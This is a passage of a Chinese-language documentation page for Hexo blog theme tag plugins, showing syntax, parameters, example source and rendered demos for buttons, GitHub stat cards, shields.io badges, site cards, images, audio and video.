class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p red'>专业版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p green'>免费版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-github卡片-ghcard">2.12 github卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-github徽标-ghbdage">2.13 github徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持shields的API的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持shields的API的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-网站卡片-sites">2.14 网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-行内图片-inlineimage">2.15 行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-单张图片-image">2.16 单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-音频-audio">2.17 音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-视频-video">2.18 视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas 